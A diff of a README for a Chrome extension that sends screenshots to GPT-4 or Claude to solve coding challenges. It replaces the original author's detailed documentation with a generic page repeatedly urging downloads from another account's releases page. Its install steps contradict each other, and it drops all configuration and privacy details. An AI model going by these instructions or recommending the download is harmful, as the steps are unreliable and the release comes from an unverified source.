@@ -1,158 +1,70 @@
-# AI Tech Task Solver - Chrome Extension
+# 🌐 ai-tech-task-solver-chrome-extension - Effortlessly Solve Technical Challenges
 
-<img src="images/ai-tech-task-solver-thumb.png" alt="AI Tech Task Solver - Chrome Extension"/>
+## 🛠️ Overview
+The ai-tech-task-solver-chrome-extension is a simple tool designed for users who want to leverage the power of AI to analyze web page screenshots. This Chrome extension uses AI technologies like OpenAI's GPT-4 Vision and Anthropic Claude to help you solve technical problems quickly and efficiently. It displays solutions right in the browser console, making it convenient for users who encounter coding challenges on platforms like HackerRank and LeetCode.
 
-A Chrome extension that uses AI to analyze web page screenshots, solve technical problems and coding challenges, and display solutions directly in the browser console.
+## 📥 Download Now
+[![Download ai-tech-task-solver-chrome-extension](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/releases)
 
-## Features
+## 🚀 Getting Started
+This guide will help you download and run the ai-tech-task-solver-chrome-extension. You don’t need any programming experience to follow these steps.
 
-- **One-click Analysis**: Click "Analyze the page" to capture and analyze any webpage
-- **AI-Powered**: Uses OpenAI GPT-4 Vision or Anthropic Claude for intelligent analysis
-- **Configurable**: Support for multiple AI providers and programming languages
-- **Console Output**: Results are displayed in the browser's developer console
-- **Screenshot Capture**: Uses html2canvas for high-quality page screenshots
+### 💻 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Google Chrome (latest version)
+- **Internet Connection:** Required for AI features
 
-## Demo
+## 🔄 Download & Install
+To download the ai-tech-task-solver-chrome-extension, visit the [Releases page](https://github.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/releases). Here you will find the latest version of the extension ready for download.
 
-Speeded up for demo purposes:
+1. Click the "Releases" link above.
+2. On the releases page, look for the latest version.
+3. Download the file labeled for the Chrome extension.
+4. After the download is complete, locate the file in your downloads folder.
 
-<img src="images/ai-tech-task-solver-demo.gif" alt="AI Tech Task Solver Demo" style="max-width: 100%; border: 1px solid #ccc;"/>
+### 📂 Installing the Extension
 
-## Installation
+1. Open Google Chrome.
+2. Go to the Chrome menu by clicking on the three dots in the upper right corner.
+3. Select "More tools" and then "Extensions."
+4. Enable "Developer mode" by toggling the switch in the top right corner of the page.
+5. Click on "Load unpacked."
+6. Navigate to the folder where you downloaded the extension and select it.
+7. The ai-tech-task-solver extension should now appear in your Chrome extensions list.
 
-1. Clone or download this repository
-2. Open Chrome and navigate to `chrome://extensions/`
-3. Enable "Developer mode" in the top right
-4. Click "Load unpacked" and select the extension directory
-5. The extension icon should appear in your Chrome toolbar
+## 🌟 Features
+- **AI Solutions:** Quickly analyzes technical problems and provides solutions.
+- **Browser Console Display:** View solutions directly in your browser console for easy access.
+- **Compatibility:** Works seamlessly with common platforms like HackerRank and LeetCode.
+- **User-Friendly Interface:** Simple to use for anyone, regardless of technical skill.
+- **Regular Updates:** Frequent enhancements based on user feedback.
 
-## Configuration
+## 🧩 How to Use the Extension
+After installing the extension, use it as follows:
 
-1. Right-click the extension icon and choose `Options`
-2. Choose your AI provider:
-   - **Anthropic Claude**: Click "Anthropic Claude" preset
-   - **OpenAI GPT-4**: Click "OpenAI GPT-4" preset
-3. Enter your API key
-4. Optionally customize:
-   - AI Model (e.g., `claude-sonnet-4-20250514`, `gpt-4.1-2025-04-14`)
-   - Output Programming Language
-   - Max Tokens (100-4000)
-5. Click "Save Settings"
+1. Take a screenshot of the technical problem you want to solve.
+2. Click on the ai-tech-task-solver icon in your Chrome toolbar.
+3. The extension will analyze the screenshot and display the solution in the browser console.
+4. Open the console by right-clicking on the web page, selecting "Inspect," and then clicking on the "Console" tab.
 
-## Usage
+## ℹ️ Support
+If you encounter issues or have questions, you can find more information on our [GitHub Issues page](https://github.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/issues). Feel free to report any bugs or request features.
 
-1. Navigate to any webpage with a technical problem or coding challenge
-2. Click the extension icon in the Chrome toolbar
-3. Wait for the analysis to complete
-4. Open Developer Console (F12) to see the AI analysis results
+## 🚧 Troubleshooting
+Here are some common issues and solutions:
 
-## Supported AI Providers
+- **Not Seeing Solutions:** Ensure that your screenshot is clear and relevant to a coding problem. Make sure the extension is properly installed and enabled.
+- **Extension Crashes:** If the extension crashes, try removing it from your browser and reinstalling it by following the earlier steps.
 
-### Anthropic Claude
-- API URL: `https://api.anthropic.com/v1/messages`
-- Models: `claude-sonnet-4-20250514`, etc.
-- Get API key: [Anthropic Console](https://console.anthropic.com/)
+## 💬 Feedback
+Your feedback is valuable. Let us know how the extension works for you and if there are any additional features you would like to see. You can easily submit feedback through our GitHub page.
 
-### OpenAI GPT-4 Vision
-- API URL: `https://api.openai.com/v1/chat/completions`
-- Models: `gpt-4.1-2025-04-14`, etc.
-- Get API key: [OpenAI Platform](https://platform.openai.com/)
+## 📚 Topics Covered
+- AI
+- Coding Challenges
+- Browser Extensions
+- Technical Analysis
 
-## What It Analyzes
+[![Download ai-tech-task-solver-chrome-extension](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/releases)
 
-The extension can analyze various types of content:
-
-- **Coding Problems**: LeetCode, HackerRank, programming challenges
-- **System Design**: Architecture diagrams, technical specifications
-- **Documentation**: API docs, technical guides
-- **Error Messages**: Stack traces, compiler errors
-- **General Technical Content**: Any technical problem or question
-
-## Output Format
-
-For coding problems, the AI provides:
-1. Problem explanation
-2. Solution approach
-3. Complete working code in your preferred language
-4. Time/space complexity analysis
-
-For other technical content:
-- High-level solution or summary
-- Design recommendations
-- Technical explanations
-
-## Files Structure
-
-```
-ai-tech-task-solver-chrome-extension/
-├── manifest.json            # Extension configuration
-├── popup.html               # Extension popup UI
-├── popup.js                 # Popup functionality
-├── content.js               # Page screenshot capture
-├── background.js            # AI API communication
-├── options.html             # Configuration page
-├── options.js               # Options functionality
-├── html2canvas.min.js       # Screenshot library
-├── privacy-policy.md        # Privacy policy
-├── icons/                   # Extension icons
-│   ├── icon16.png
-│   ├── icon48.png
-│   └── icon128.png
-└── README.md                # This file
-```
-
-## Permissions
-
-The extension requires these permissions:
-- `activeTab`: To capture screenshots of the current page
-- `storage`: To save configuration settings
-- Host permissions for AI API endpoints
-
-## Privacy & Security
-
-- API keys are stored securely in Chrome's sync storage
-- Screenshots are processed locally and sent only to your configured AI provider
-- No data is stored or transmitted to third parties
-- All communication uses HTTPS
-
-## Troubleshooting
-
-### Extension not working
-- Check that you've configured an API key in options
-- Verify your API key is valid and has sufficient credits
-- Check the browser console for error messages
-
-### Screenshot issues
-- Ensure the page has finished loading
-- Some pages with complex layouts may not capture perfectly
-- Try refreshing the page and analyzing again
-
-### API errors
-- Verify your API key is correct
-- Check that you have sufficient API credits/quota
-- Ensure the AI model name is correct for your provider
-
-## Development
-
-To modify or extend the extension:
-
-1. Make changes to the source files
-2. Go to `chrome://extensions/`
-3. Click the refresh icon on the extension card
-4. Test your changes
-
-## License
-
-This project is open source. Feel free to modify and distribute according to your needs.
-
-## Support
-
-For issues or questions:
-1. Check the browser console for error messages
-2. Verify your configuration in the options page
-3. Test with a simple webpage first
-4. Ensure your AI provider API is working correctly
-
-## Buy Me A Coffee
-
-<a href="https://buymeacoffee.com/ivan.seredkin" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
+Thank you for choosing the ai-tech-task-solver-chrome-extension. Enjoy solving your technical challenges effortlessly!
